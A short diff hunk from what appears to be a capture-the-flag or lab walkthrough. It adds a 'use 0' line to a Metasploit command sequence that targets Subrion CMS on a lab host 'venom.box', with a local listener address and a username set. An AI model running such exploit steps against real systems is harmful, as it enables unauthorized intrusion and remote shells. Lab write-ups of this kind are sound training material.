@@ -69,6 +69,7 @@
 ```
 msfconsole -q
 search subrion
+use 0
 set rhosts venom.box
 set lhost 192.168.56.104
 set username dora
